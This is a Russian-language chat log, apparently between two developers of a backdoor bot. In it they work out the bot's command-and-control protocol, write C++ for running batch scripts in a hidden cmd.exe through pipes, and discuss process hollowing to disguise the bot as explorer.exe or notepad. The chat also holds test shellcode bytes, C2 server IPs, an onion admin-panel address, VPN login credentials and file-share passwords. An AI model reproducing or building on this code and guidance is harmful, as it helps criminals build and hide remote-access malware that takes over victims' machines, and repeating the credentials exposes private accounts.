Timestamp	From	To	Message
2020-10-14 17:24:34.668116	cany	kaktus	это как делается?
2020-10-14 17:25:02.736519	kaktus	cany	данные - тело скрипта надо отправлять через пайп
2020-10-14 17:25:27.421065	cany	kaktus	куда?
2020-10-14 17:28:28.392010	kaktus	cany	для bat: запускаешь cmd.exe с перенаправленными вводом/выводом
2020-10-14 17:28:30.364946	kaktus	cany	то есть с пайпами, во входной пишешь исходный скрипт
2020-10-14 17:28:52.913140	kaktus	cany	в конце добавть "\nexit\n" - так как последняя команда в файле может не выполниться
2020-10-14 17:29:14.343423	kaktus	cany	в powershell также, там он запускается с определенным ключем, в ТЗ это есть
2020-10-14 17:29:48.999635	cany	kaktus	а скрипт писать по командам?
2020-10-14 17:29:51.975416	kaktus	cany	через пайпы - есть ряд ограничений - например, аргументы не удастся передать
2020-10-14 17:29:54.947152	cany	kaktus	или сразу все?
2020-10-14 17:30:25.939966	kaktus	cany	не пишешь кусками с буфером заданного размера
2020-10-14 17:31:02.103602	kaktus	cany	на входе будет скрипт построчно, т.е. команды будут последовательно приниматься разделенные переводом строки и выполняться
2020-10-14 17:32:04.535803	cany	kaktus	когда поступает команда на скачивание
2020-10-14 17:32:09.682984	cany	kaktus	если в пути есть пробелы
2020-10-14 17:32:17.027014	cany	kaktus	в названии директории
2020-10-14 17:33:03.530955	kaktus	cany	так этот вопрос когда-то изучался
2020-10-14 17:33:13.914836	kaktus	cany	а в чем там проблема сейчас?
2020-10-14 17:38:24.458364	cany	kaktus	я этот вопрос впервые задал
2020-10-14 17:38:45.615633	cany	kaktus	ну ладно
2020-10-14 17:38:50.301537	kaktus	cany	в смысле я с веб-кодером раньше обсуждал
2020-10-14 17:39:00.864161	kaktus	cany	у тебя в чем сложность?
2020-10-14 17:39:25.273312	cany	kaktus	пробел как-то экранируется?
2020-10-14 17:39:48.140254	cany	kaktus	ладно я посмотрю сам еще
2020-10-14 17:40:34.681095	kaktus	cany	ты про команду 16 закачка на сервер?
2020-10-14 17:40:39.697423	cany	kaktus	в команде terminate process в поле с пидом можно написать все что угодно
2020-10-14 17:40:55.908722	cany	kaktus	мне ожидать что придет не валидное значение?
2020-10-14 17:49:24.448884	kaktus	cany	команда 16 идет в виде код-пробел-имя_файла. Причем имя файла вводится оператором вручную, в нем может быть что угодно. Тебе надо принять возможные корректные варианты имени с полным путем - тоесть может быть в кавычках (как в некоторых API требуется), может без. Если корректный полный путь не распарсился, то считаешь всю команду некорректной и меняешь на "по умолчанию"
2020-10-14 17:51:09.268359	kaktus	cany	terminate process - тоже самое, данные вводит пользователь и проверку по максимуму ты делаешь при попытке распарсить. Если вместо пид пусто или буквы а не цифры - считаешь что команда некорректная
2020-10-14 17:53:19.348684	cany	kaktus	и на фронте валидность вообще никак не проверяется?
2020-10-14 17:54:01.908808	kaktus	cany	считай что нет, у тебя задача любую команду проверить (какую ты сам сможешь ввести в админке), определить корректность и распарсить
2020-10-14 17:54:32.676577	cany	kaktus	когда запуск чего-то идет с помощью дампа, в какую директорию мне сохранять?
2020-10-14 17:57:52.305035	kaktus	cany	будет достаточно в %temp% в первой версии
2020-10-14 18:03:26.675162	cany	kaktus	в terminate process в тз написано в ответе отправить результат выполнения GetLastError() сразу после выполнения TerminateProcess()
2020-10-14 18:03:34.624955	cany	kaktus	если была ошибка до этого
2020-10-14 18:04:11.957091	cany	kaktus	то она вернет эту ошибку не смотря на то что terminate правильно отработал
2020-10-14 18:08:10.648724	cany	kaktus	и я вот отвечаю серверу на команду остановки процесса
2020-10-14 18:08:15.864672	cany	kaktus	отправляю номер пида
2020-10-14 18:08:16.669839	kaktus	cany	сбрось сначала: 1) SetLastError(0) 2) TerminateProcess(...)
2020-10-14 18:08:23.390225	cany	kaktus	понял
2020-10-14 18:08:31.525249	cany	kaktus	отправляю пид
2020-10-14 18:08:44.043741	cany	kaktus	и он не принимает
2020-10-14 18:09:05.716055	cany	kaktus	заголовок такой
2020-10-14 18:09:06.321769	cany	kaktus	Cookie: group=canytest\r\nContent-Type: form/urlencoded
2020-10-14 18:09:11.436952	kaktus	cany	куда номер пида отправляешь?
2020-10-14 18:09:25.479728	cany	kaktus	на сервер %id%/3
2020-10-14 18:10:37.701791	kaktus	cany	form/urlencoded - не так, формат по другому называется
2020-10-14 18:13:00.213099	kaktus	cany	Content-Type: application/x-www-form-urlencoded
2020-10-14 18:29:52.646705	cany	kaktus	ты мне кидал по допелю cpp файл
2020-10-14 18:29:59.454927	cany	kaktus	а заголовочные можешь?
2020-10-14 18:32:54.739658	kaktus	cany	каких не хватает?
2020-10-14 18:33:39.880886	cany	kaktus	..\nttypes.h
pe_hdrs_helper.h
2020-10-14 18:38:04.044913	kaktus	cany	v7Ms2N(se^jAxieN
2020-10-14 18:38:05.758081	kaktus	cany	Download: https://qaz.im/load/isnYzY/YBzDS8
Delete: https://qaz.im/index.php?a=delete&q=1584027253
2020-10-14 18:40:19.063931	cany	kaktus	с Content-Type все равно не выходит
2020-10-14 18:40:24.677912	cany	kaktus	с которым ты написал
2020-10-14 18:41:06.862653	kaktus	cany	у тебя один формат отчетов на все команды (кроме 16 отправка файла), если систинфо проходит - по тому же принципу все остальные должны
2020-10-14 18:41:25.280745	kaktus	cany	в плане алгоритма кодирования, то есть
2020-10-16 16:11:10.883820	cany	kaktus	привет
2020-10-16 16:11:14.795444	cany	kaktus	ip бк не менялся?
2020-10-16 16:18:38.213498	kaktus	cany	привет
2020-10-16 16:18:39.477576	kaktus	cany	18.188.194.80
2020-10-16 16:18:43.109331	kaktus	cany	вот этот пробуй
2020-10-16 16:19:07.660661	kaktus	cany	и еще резервный 54.91.36.142
2020-10-16 16:19:57.519563	cany	kaktus	подошло
2020-10-18 17:16:03.023670	cany	kaktus	привет
2020-10-18 17:16:12.772127	cany	kaktus	у бк опять ip изменились?
2020-10-18 17:22:57.598048	kaktus	cany	привет!
2020-10-18 17:22:58.852528	kaktus	cany	54.236.253.121
2020-10-18 17:23:18.374398	kaktus	cany	54.201.135.91
2020-10-19 07:56:45.255818	kaktus	cany	новый адрес админки БК
2020-10-19 07:56:46.773248	kaktus	cany	https://qsohf4rg4nscdkun.onion:4247/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/
2020-10-19 07:56:54.113272	kaktus	cany	учетные данные старые
2020-10-19 14:32:48.750780	kaktus	cany	админка БК работает пока по старому адресу, новый отменен
2020-10-19 18:16:36.012107	kaktus	cany	новый адрес админки БК
2020-10-19 18:16:36.187299	kaktus	cany	https://qsohf4rg4nscdkun.onion:4247/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/
2020-10-19 18:16:36.187856	kaktus	cany	учетные данные старые
2020-10-19 18:16:36.189064	kaktus	cany	админка БК работает пока по старому адресу, новый отменен
2020-10-19 21:02:32.719523	cany	kaktus	у меня впн истекает
2020-10-20 06:44:05.808711	cany	kaktus	у меня впн истекает
2020-10-20 17:18:27.089897	cany	kaktus	привет
2020-10-20 17:19:08.693413	kaktus	cany	Привет!
2020-10-20 17:19:14.676346	kaktus	cany	впн заказал, пока не готово
2020-10-20 17:22:17.196133	cany	kaktus	почему то сервер не принимает ответы на выполнение exe
2020-10-20 17:22:20.520176	cany	kaktus	и на dll
2020-10-20 17:22:32.329044	cany	kaktus	команда становится pending
2020-10-20 17:22:41.590510	cany	kaktus	и он готов отправлять новую
2020-10-20 17:23:34.403713	kaktus	cany	pending - значит что бот забрал команду и она в на выполнении
2020-10-20 17:23:43.660739	kaktus	cany	то есть отчет по команде еще не получен
2020-10-20 17:24:01.496317	cany	kaktus	но в этоге я отправляю а не доходит
2020-10-20 17:24:22.528903	kaktus	cany	как не доходит - ошибка, нет соединения вообще?
2020-10-20 17:24:56.342194	kaktus	cany	какой код ответа сервера на отчет - если 500 надо смотреть ответ (что-то не так с форматом)
2020-10-20 17:25:50.197584	kaktus	cany	в ответе ты направляешь хедер с группой?
2020-10-20 17:26:06.540344	cany	kaktus	в cookie
2020-10-20 17:26:35.219294	kaktus	cany	да, также как в GET /%id%/2
2020-10-20 17:30:54.187981	cany	kaktus	не получается выполнить bat через pipe
2020-10-20 17:31:46.292906	cany	kaktus	в пайп пишутся команды
2020-10-20 17:31:57.526391	cany	kaktus	а на выходе эти же команды
2020-10-20 17:32:47.217088	kaktus	cany	в какой пайп пишешь команды?
2020-10-20 17:34:06.565403	cany	kaktus	у меня 2 пайпа
2020-10-20 17:34:32.687640	kaktus	cany	гит не открыватся, заработает посмотрю
2020-10-20 17:34:48.256002	cany	kaktus	я и закомитить туда не мог
2020-10-20 17:35:05.434187	cany	kaktus	void RunChannelBat(string bat)
{
	HANDLE readBegin, writeBegin;
	HANDLE readEnd, writeEnd;

	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	PROCESS_INFORMATION pi = { 0 };
	DWORD tbRead = 0;
	DWORD errRead = 0;
	DWORD bRead = 0;
	DWORD currentRead = 0;
	DWORD cbWritten = 0;
	string outputResult;

	if (!CreatePipe(&readBegin, &writeBegin, &sa, 0))
	{

	}

	if (!CreatePipe(&readEnd, &writeEnd, &sa, 0))
	{

	}

	_STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = readBegin;
	si.hStdOutput = writeEnd;
	si.hStdError = writeEnd;

	char wbuf[512];
	DWORD dw1 = GetSystemDirectoryA(wbuf, 512);
	string cmd(wbuf, dw1);
	cmd += "\\cmd.exe";
	/*SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
	SetHandleInformation(hStdErrRd, HANDLE_FLAG_INHERIT, 0);*/

	CreateProcessA((char*)cmd.c_str(), NULL, NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	Sleep(1000);
	auto arr = split(bat, "\r\n");
	arr.push_back("exit");
	//WriteFile(writeBegin, bat.c_str(), bat.size(), &cbWritten, NULL);
	for (size_t i = 0; i < arr.size(); ++i)
	{
		string str = arr.at(i) + "\r\n";
		WriteFile(writeBegin, str.c_str(), str.size(), &cbWritten, NULL);
	}
	//Sleep(1000);
	outputResult = ReadResultFromPipe(readEnd);

	return;
2020-10-20 17:35:34.471578	cany	kaktus	различные варианты пробовал
2020-10-20 17:35:44.298791	cany	kaktus	и в createprocess передавать весь батник
2020-10-20 17:35:56.788463	cany	kaktus	и разом все записать в пайп
2020-10-20 17:40:36.303465	cany	kaktus	еще по допелю в заголовочных что ты мне скинул есть еще заголовочный "includes.h"
2020-10-20 17:56:08.203737	kaktus	cany	b7mSg3jWKa@fvZMIRhg8D
2020-10-20 17:56:09.536042	kaktus	cany	Download: https://qaz.im/load/8hHBE4/94yzB6
Delete: https://qaz.im/index.php?a=delete&q=747023653
2020-10-20 17:56:18.914776	kaktus	cany	пример корректного отчета по команде Run EXE
2020-10-20 17:57:07.450692	kaktus	cany	"includes.h" - общие хедеры (для всех модулей), аналог стандартного stdafx.h
2020-10-20 17:57:35.418708	kaktus	cany	#include <Winsock2.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <strsafe.h>
#include <Winhttp.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <stdint.h>
#include <KtmW32.h>
#include <userenv.h>
#include <type_traits>
2020-10-20 18:01:43.636887	kaktus	cany	запуск бат через пайп: запускай cmd.exe с ключем /k
2020-10-20 18:02:07.410562	kaktus	cany	можешь писать весь бат целиком в пайп, без разбивки по строкам
2020-10-20 18:02:18.465763	kaktus	cany	в конце допиши "\nexit\n"
2020-10-20 18:11:59.923876	cany	kaktus	в process hollowed нужно stdout и stderr прочитать
2020-10-20 18:12:08.201701	cany	kaktus	я делаю так же как и с дампом
2020-10-20 18:12:25.723676	cany	kaktus	те в createprocess передаю пайпы
2020-10-20 18:12:34.817282	cany	kaktus	но читать от туда не получается
2020-10-20 18:18:17.378439	kaktus	cany	anonymous-vpn.biz famada@ro.ru 4137LGY5P2V
2020-10-20 18:18:20.022316	kaktus	cany	новый ВПН
2020-10-20 18:21:16.294011	kaktus	cany	[21:12:35] <asmwardest> но читать от туда не получается
2020-10-20 18:21:30.951754	kaktus	cany	ошибка при чтении?
2020-10-20 18:23:40.860190	cany	kaktus	PeekNamedPipe(hStdOutRd, NULL, NULL, NULL, &tbRead, NULL);
2020-10-20 18:23:50.440194	cany	kaktus	в tbRead ничего не приходит
2020-10-20 18:24:38.573999	kaktus	cany	нагрузка которую ты инжектишь - работает?
2020-10-20 18:24:43.361751	kaktus	cany	а то может процесс сразу с ошибкой вылетает
2020-10-20 18:25:23.070969	cany	kaktus	да
2020-10-20 18:25:25.987094	cany	kaktus	работает
2020-10-20 18:28:58.798352	kaktus	cany	PeekNamedPipe с ошибкой завершается?
2020-10-20 18:29:03.087446	kaktus	cany	GetLastError() после нее какой код?
2020-10-20 18:33:06.567579	kaktus	cany	ты хост-процесс создаешь без наследования хендлов
2020-10-20 18:33:18.466712	kaktus	cany	bInheritHandles = TRUE должно быть
2020-10-20 18:33:41.191424	kaktus	cany	пятый аргумент в CreateProcessA
2020-10-20 18:34:56.348272	kaktus	cany	шестой аргумент надо CREATE_NEW_CONSOLE | CREATE_SUSPENDED
2020-10-20 18:35:07.500775	kaktus	cany	иначе не получится инжектить консольную нагрузку в GUI-хост и наоборот
2020-10-20 18:35:13.027351	cany	kaktus	а вот то что маскируем под блокнот например
2020-10-20 18:35:17.439722	cany	kaktus	но в инфе о процессе
2020-10-20 18:35:28.367952	cany	kaktus	видно что директория бэкдора
2020-10-20 18:35:34.305124	cany	kaktus	и отец тоже он
2020-10-20 18:35:37.428695	cany	kaktus	это нормально?
2020-10-20 18:36:02.095840	kaktus	cany	директорию ты при запуске можешь задать
2020-10-20 18:36:15.162261	kaktus	cany	она берется из среды окружения родительского процесса, если явно не указывать
2020-10-20 18:36:43.931399	cany	kaktus	это нужно делать?
2020-10-20 18:37:12.946902	kaktus	cany	в боевом режиме у тебя бот будет сам работать из холловинга, тоевсть explorer.exe или cmd.exe
2020-10-20 18:37:31.214606	cany	kaktus	ну да
2020-10-20 18:37:35.703299	kaktus	cany	и создаваемые им чилд-процессы будут наследовать соответственно
2020-10-20 18:37:59.035939	cany	kaktus	а вот все таки например я отправляю инфу о системе
2020-10-20 18:38:05.711530	cany	kaktus	у меня там встречаются русские символы
2020-10-20 18:38:06.113333	kaktus	cany	то есть если это надо будет делать - то в лоадере
2020-10-20 18:38:28.440795	cany	kaktus	мне нужно добиться чтобы они корректно отправлялись?
2020-10-20 18:38:59.190495	kaktus	cany	корректно это как?
2020-10-20 18:39:20.587233	kaktus	cany	сейчас я твой отчет гляну
2020-10-20 18:39:31.950337	cany	kaktus	чтобы на сервере по русски тоже был текст
2020-10-20 18:45:28.063800	kaktus	cany	у тебя последний отчет нормальный, все корректно
2020-10-20 18:46:22.412647	kaktus	cany	сервер не заточен под работу с русским, на 95% ПО будет использоваться на англоязычных машинах
2020-10-20 18:46:45.337174	kaktus	cany	поэтому оставляй как есть
2020-10-20 18:47:20.930040	kaktus	cany	когда будут конкретно по этому вопросы замечания - тогда и озадачишься
2020-10-20 18:48:50.127776	cany	kaktus	хорошо
2020-10-20 18:56:33.686805	cany	kaktus	а для пайпов обязательно делать
2020-10-20 18:56:33.894031	cany	kaktus	SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
2020-10-20 18:56:36.969009	cany	kaktus	?
2020-10-20 18:57:53.454753	kaktus	cany	нет
2020-10-20 18:59:01.020756	kaktus	cany	это на случай чтобы второй конец пайпа тоже в какой-нибудь процесс не передать
2020-10-20 18:59:23.716966	kaktus	cany	но у тебя их всего 3 штуки, не ошибешься наверное)
2020-10-20 18:59:50.918699	cany	kaktus	ага
2020-10-20 19:00:24.675084	cany	kaktus	а как можно из потока вернуть строку?
2020-10-20 19:00:32.244482	cany	kaktus	как результат выполнения функции
2020-10-20 19:01:19.657648	kaktus	cany	тоесть
2020-10-20 19:01:41.501907	cany	kaktus	у меня функция отработала в отдельном потоке
2020-10-20 19:01:51.640735	cany	kaktus	я могу как-то получить результат этой функции
2020-10-20 19:02:20.099062	cany	kaktus	не просто ее код возврата
2020-10-20 19:02:31.811123	cany	kaktus	а строку какую нибудь
2020-10-20 19:02:43.686270	kaktus	cany	шеллкод?
2020-10-20 19:02:52.825663	cany	kaktus	не
2020-10-20 19:03:03.776228	cany	kaktus	моя обычная
2020-10-20 19:03:23.107196	kaktus	cany	в поток передается параметр, он может быть любого типа - например указатель на массив
2020-10-20 19:03:40.509391	kaktus	cany	в потоке пишешь в этот массив (или даже аллоцируешь память там)
2020-10-20 19:03:40.791262	cany	kaktus	а обратно в главный поток?
2020-10-20 19:04:07.291996	kaktus	cany	родительский поток передает этот указатель же, тоесть он знает где массив
2020-10-20 19:04:30.712401	cany	kaktus	если не динамический то по окончанию потока там пустая строка
2020-10-20 19:05:06.589104	kaktus	cany	ты память выделяешь в родительском потоке, или в самом дочернем?
2020-10-20 19:05:19.518672	cany	kaktus	я динамически не выделяю
2020-10-20 19:05:37.822054	cany	kaktus	мне по хорошему из потока string вернуть надо
2020-10-20 19:05:41.804272	cany	kaktus	ну или char*
2020-10-20 19:05:56.798404	kaktus	cany	string потокобезопасный класс?
2020-10-20 19:06:17.336531	cany	kaktus	вряд ли
2020-10-20 19:06:49.771122	kaktus	cany	ты можешь передать в поток указатель на указатель, и в него записать char*
2020-10-20 19:07:37.708537	kaktus	cany	тут надо смотреть контекст - данные которые ты передаешь в поток будут эксклюзивно в нем использоваться, или нет
2020-10-20 19:07:43.826337	cany	kaktus	динамически выделить нужное количество памяти в дочернем, а зачистить в родительском?
2020-10-20 19:07:52.297136	kaktus	cany	а то надо делать тогда разграничение, через критическую секцию или мьютекс
2020-10-20 19:08:40.912832	kaktus	cany	как родительский поток проверяет что данные готовы - ждет завершения дочернего потока, периодически сам обращается к памяти?
2020-10-20 19:09:32.204356	cany	kaktus	ждет завершение дочернего процесса и потом использует эти данные
2020-10-20 19:09:35.492069	cany	kaktus	либо не ждет
2020-10-20 19:09:41.105259	cany	kaktus	тогда на данные наплевать
2020-10-20 19:10:03.805310	cany	kaktus	хотя получается освобождение памяти ни кто не сделает
2020-10-20 19:10:15.687421	kaktus	cany	ждет завершение дочернего процесса - так процесса или потока
2020-10-20 19:10:23.257493	cany	kaktus	потока
2020-10-20 19:10:33.690562	cany	kaktus	сейчас речь про потоки
2020-10-20 19:11:10.588843	cany	kaktus	либо использовать глобалки
2020-10-20 19:11:40.817088	cany	kaktus	может наступить момент когда одновременно захотят использовать переменную
2020-10-20 19:11:47.343011	cany	kaktus	но есть mutex
2020-10-20 19:12:28.534979	cany	kaktus	проблема с глобалкой возникла, что если юзать ее в разных cpp то ошибка при компиляции unresolved external symbol...
2020-10-20 19:15:33.609803	cany	kaktus	и еще мне при чтении stdout и stderr нужно их различать и в разные пайпы их писать?
2020-10-20 19:15:39.861716	cany	kaktus	или можно в перемешку все?
2020-10-20 19:17:11.833939	kaktus	cany	можно пока в один, но лучше в разные - данные могут перемешиваться на полуслове
2020-10-20 19:20:35.437803	kaktus	cany	[18.09.2020 15:44:48] <kaktus> скрипт пишет данные - может в out, может в err, может в оба потока попеременно - бери это за основу. 
[18.09.2020 15:45:17] <kaktus> Если у него перенаправлены два вывода в один поток - то они будут путаться.
[18.09.2020 15:45:26] <kaktus> перемешиваться*
[18.09.2020 15:46:29] <kaktus> пример: out AAABBBCCC, err DDDEEEFFF. С одним пайпом ты можешь принять вывод AADDDEABBBEEFCCFC
2020-10-20 19:21:26.522102	kaktus	cany	ошибка при компиляции unresolved external symbol... - на какую функцию?
2020-10-20 19:21:34.514286	cany	kaktus	а мне заканчивать ждать что-то из пайпа до завершения процесса?
2020-10-20 19:21:45.130918	cany	kaktus	на глобальную переменную
2020-10-20 19:24:54.561282	kaktus	cany	можно же объявить в отдельном модуле пару функций - SetGlobalValue, GetGlobalValue и через них ее юзать
2020-10-20 19:25:27.174387	cany	kaktus	попробую
2020-10-20 19:26:01.468615	kaktus	cany	можно сделать структуру с глобальными данными бота, инициировать в стартовой функции и передавать по ссылке везде где она будет нужна
2020-10-20 19:26:36.572197	cany	kaktus	но у меня результат выполнения команды
2020-10-20 19:26:40.981422	cany	kaktus	те строка
2020-10-20 19:26:48.082807	cany	kaktus	в другом потоке находится
2020-10-20 19:26:58.068904	cany	kaktus	глобальные данные это да
2020-10-20 19:26:58.272270	kaktus	cany	в структуре одно поле - ссылка на буфер данных
2020-10-20 19:27:36.191918	kaktus	cany	в поток передаешь эту ссылку, дальше поток работает с буфером данных, привязанным к главной структуре
2020-10-20 19:28:15.415998	cany	kaktus	не совсем понял
2020-10-20 19:42:36.583660	kaktus	cany	объявляем структуры в каком-нибудь общем хедер-файле
2020-10-20 19:42:50.234839	kaktus	cany	typedef struct _BDModuleExecData
{ //данные, используемые при контроле выполнения запущенного модуля/скрипта
	bool is_executing;						// признак того, что дочерний процесс выполняется
	DWORD ProcessStatus;					// последний статус текущего дочернего процесса
	DWORD ProcessStartTime;					// время запуска дочернего процесса 
	PROCESS_INFORMATION pi;					// структура PROCESS_INFORMATION с данными дочернего процесса
	HANDLE hRedirectStdOut;					// пайп для чтения потока STDOUT дочернего процесса
	HANDLE hRedirectStdErr;					// пайп для чтения потока STDERR дочернего процесса
	sBDCommandReport pStdOut;				// выходные данные потока STDOUT дочернего процесса
	sBDCommandReport pStdErr;				// выходные данные потока STDERR дочернего процесса
	char *TmpFileName;						// имя файла модуля (для режима запуска "дамп в файл")
} sBDModuleExecData;

typedef struct _BDMainData
{ //основные данные бота
...
	sBDModuleExecData module_exec_data;			// данные о выполнении модуля/скрипта
...

} sBDMainData;
2020-10-20 19:43:08.817322	kaktus	cany	в главной функции:
2020-10-20 19:43:14.658721	kaktus	cany	void BackDoor_Main()
{
...
	//основные переменные
	sBDMainData * BDMainData = nullptr;
...
BDMainData = (sBDMainData *)HEAP::pAlloc(sizeof(sBDMainData));
	if (!InitBDMainData(BDMainData))
	{
...
	}
...
	BDExecuteCommand(BDMainData...);
...
}
2020-10-20 19:44:02.560621	kaktus	cany	в обработке команд:
2020-10-20 19:44:29.783430	kaktus	cany	int BDExecuteCommand(sBDMainData * bdmaindata, ...)
{ // стартовая подпрограмма выполнения полученной команды
...
		case BDCMD_COMMAND_CODE_RUNEXE: // запуск исполняемого модуля (exe)
		case BDCMD_COMMAND_CODE_RUNDLL: // запуск динамической библиотеки (dll)
		case BDCMD_COMMAND_CODE_RUNBAT: // запуск командного файла (bat)
		case BDCMD_COMMAND_CODE_RUNPWS: // запуск скрипта powershell (ps1)
			switch (BDCommandRunAll(bdmaindata, ...))
			{
...
			}
...
if (bdmaindata->is_bd_blocked_mode)
	{
		BDControlChildProcess(bdmaindata, ...);
	}
...
}
...
int BDCommandRunAll(sBDMainData * bdmaindata, ...)
{ //стартовая подпрограмма обработки команд запуска модулей/скриптов или самообновления
...
if (!LoadExeModule(..., &bdmaindata->module_exec_data, ...))
	{
...
	}
...
}
...
bool LoadExeModule(..., sBDModuleExecData * execdata, ...)
{  //основная подпрограммы подготовки к выполнению команд запуска модуля/скрипта или самообновления
...
result = CreateSimpleProcess(... &execdata->pi, ...);
...

...
}
2020-10-20 19:45:02.411270	kaktus	cany	собираем выходные данные с дочернего процесса:
2020-10-20 19:45:19.658195	kaktus	cany	void BDControlChildProcess(sBDMainData * bdmaindata, ...)
{ //выполняется "контроль" запущенного дочернего процесса (определяется статус, принимаются выходные данные)
...
RetrieveProcessOutputStdStreams(&bdmaindata->module_exec_data, ...);
...
}
...
bool RetrieveProcessOutputStdStreams(sBDModuleExecData * execdata, DWORD TimeOut)
{ //получает выходные данные дочернего процесса из потоков STDOUT и STDERR
...
}
2020-10-20 19:46:34.305718	kaktus	cany	таким образом, все данные привязаны к основной структуре, которая доступна из главного цикла и и ссылка на нее передается при необходимости
2020-10-20 19:58:31.950837	kaktus	cany	не рассматривал вариант чтобы сделать весь бот одном потоке?
2020-10-20 19:58:48.430793	cany	kaktus	а таймауты как реализовать?
2020-10-20 19:59:06.472080	kaktus	cany	кроме шеллкода, его по любому в отдельный поток надо, потому что он в режиме "запустил и забыл", но в контексте этого же процесса, к тому же упасть может
2020-10-20 20:01:03.421411	kaktus	cany	тебе приходит команда выполнять скрипт/модуль - в ней есть общий таймаут (A1), также есть таймаут для проверки следующей команды (A2). Запускаешь процесс и цикл сбора данных на A2 времени, затем возвращаешься в цикл получения следующей команды
2020-10-20 20:02:07.523241	kaktus	cany	получил команду, распарсил - возвращаешься в подпрограмму обработки команд. Проверяешь - бот в блокируещем режиме или нет. Если блокирующий - обрабатываешь только сброс/суицид, иначе возвращаешься к сбору данных на A2 времени.
2020-10-20 20:02:54.015042	cany	kaktus	я примерно так и планировал
2020-10-20 20:03:04.837656	cany	kaktus	плохо только что на ходу
2020-10-20 20:03:07.853810	cany	kaktus	вышло
2020-10-20 20:03:32.345001	cany	kaktus	а блокирующий режим это что будет?
2020-10-20 20:03:47.069657	cany	kaktus	мютекс или флаг может обычный?
2020-10-20 20:04:39.931331	kaktus	cany	ну это просто флаг, показывает выполняется ли в текущий момент команда запуска модуля/скрипта со сбором данных
2020-10-20 20:06:22.231416	kaktus	cany	в многопоточном можно будет и через мьютекс, который затем просигналить при получении сброса/суицида
2020-10-20 20:07:18.654984	kaktus	cany	у меня если что только один бот, он однопоточный. Что проще в реализации и понятности - линейный или многопоточный, не могу сказать.
2020-10-20 20:08:10.367844	kaktus	cany	но мне он сразу показался линейным, поэтому многопоточный вариант не рассматривал
2020-10-20 20:08:51.262765	cany	kaktus	ты имеешь ввиду линейный с отдельными форками для одной команды?
2020-10-20 20:11:54.122144	kaktus	cany	линейный в смысле - последовательное выполнение, каждый этап выполняется в заданных интервалах времени, заранее известных
2020-10-20 20:15:55.414584	kaktus	cany	параллельных вычислений тут нет, поэтому правильно организованный поток данных/управления не должен распараллеливаться. ХОтя возможно использование нескольких потоков упростит управление.
2020-10-20 20:17:06.153815	cany	kaktus	но все равно ведь когда таймаут 0
2020-10-20 20:17:09.418482	kaktus	cany	это только мое мнение, никак не указываю как делать - выбирай наиоблее удобный для себя вариант
2020-10-20 20:18:11.166053	kaktus	cany	когда таймаут ноль - мы запускаем дочерний процесс в фоне - запустили и забыли, выходные данные с него не собираем, завершения не ожидаем
2020-10-20 20:18:34.026766	kaktus	cany	в блокирующий режим не переходим*
2020-10-20 20:21:05.264648	cany	kaktus	а чтобы в process hollowed передать параметры достаточно их указать в createprocess?
2020-10-20 20:22:49.000041	kaktus	cany	да, в параметр CommandLine передаешь имя хост-exe и аргументы
2020-10-20 20:22:59.969091	kaktus	cany	параметры привязываются в PEB
2020-10-20 20:23:23.315981	kaktus	cany	инжекнутый процесс может получить их в любом случае
2020-10-20 20:39:11.527102	cany	kaktus	а есть примеры шелкода?
2020-10-20 20:44:53.908900	kaktus	cany	"90 B8 0A 00 00 00 90 90 48 90 90 75 F9 90 90 C3 "
2020-10-20 20:44:58.506043	kaktus	cany	"90 90 90 90 B8 0A 00 00 00 90 90 48 90 90 75 F9 90 90 C3 90 90 00 00  "
2020-10-20 20:45:40.519905	kaktus	cany	вроде для x86 только
2020-10-20 20:46:22.561028	kaktus	cany	просто циклы конечный на сколько-то секунд и бесконечный
2020-10-20 22:44:52.620543	cany	kaktus	9qHbFT^9FNGBQ[Qfe4}*f*w
2020-10-20 22:46:02.740299	cany	kaktus	Download: https://qaz.im/load/sQSFny/EZeQNf
Delete: https://qaz.im/index.php?a=delete&q=1324875382
